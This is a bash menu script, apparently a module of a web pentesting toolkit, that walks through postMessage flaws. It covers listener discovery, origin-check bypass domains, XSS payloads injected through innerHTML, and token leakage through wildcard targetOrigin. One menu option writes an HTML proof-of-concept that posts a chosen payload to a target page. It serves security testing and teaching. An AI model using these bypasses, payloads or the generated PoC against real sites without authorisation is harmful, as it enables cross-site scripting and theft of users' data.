#!/bin/bash
# HackTricks Ref: postmessage-vulnerabilities
# Module: PostMessage Security Analysis

echo -e "${C6}[WEB ATTACK: POSTMESSAGE_VULNS]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities"
echo -e "--------------------------------------------------"

echo -e "${C4}Select PostMessage Attack Vector:${NC}"
echo "1) Check for Insecure Event Listeners (Passive)"
echo "2) Origin Validation Bypass (Regex flaws)"
echo "3) PostMessage to XSS (Exploiting 'eval' or '.innerHTML')"
echo "4) Sensitive Data Leakage via PostMessage"
echo "5) Generate Attack PoC (Iframe based)"
echo "0) Exit"

read -p "Selection: " pm_opt

case $pm_opt in
    1)
        echo -e "\n${C2}[*] Manual Discovery:${NC}"
        echo "Open Browser Console (F12) and search for listeners:"
        echo " - Use 'Global Listeners' in Burp Suite or search JS for: window.addEventListener('message', ...)"
        echo " - Look for missing origin checks: if (event.origin !== 'https://trusted.com') return;"
        ;;
    2)
        echo -e "\n${C2}[*] Origin Bypass Techniques:${NC}"
        echo "If the check uses '.indexOf()' or weak Regex:"
        echo " - Logic: if(event.origin.includes('target.com'))"
        echo " - Bypass: https://target.com.attacker.com or https://attacker.com/target.com"
        echo " - Regex: /^https:\/\/target.com/ -> Bypass: https://target.com.attacker.com"
        ;;
    3)
        echo -e "\n${C2}[*] PostMessage to XSS:${NC}"
        echo "If the listener takes the message data and inserts it into the DOM:"
        echo " - Example: element.innerHTML = event.data;"
        echo " - Payload: <img src=x onerror=alert(document.domain)>"
        echo " - If data is JSON: {\"type\":\"render\", \"html\":\"<img src=x onerror=alert(1)>\"}"
        ;;
    4)
        echo -e "\n${C2}[*] Data Leakage:${NC}"
        echo "Check if the application sends sensitive data (tokens, PII) via postMessage"
        echo "without specifying a targetOrigin (using '*' instead)."
        echo " - Attack: Parent window opens the target and listens for the message."
        ;;
    5)
        echo -e "\n${C2}[*] Generating PostMessage PoC:${NC}"
        read -p "Target URL (Vulnerable page): " target
        read -p "Payload (e.g. {\"action\":\"exec\"}): " payload
        cat <<EOF > pm_attack.html
<html>
<body>
    <script>
        const target = window.open('$target');
        setTimeout(() => {
            target.postMessage($payload, '*');
        }, 3000);
    </script>
</body>
</html>
EOF
        echo -e "${C2}[+] PoC saved to pm_attack.html${NC}"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
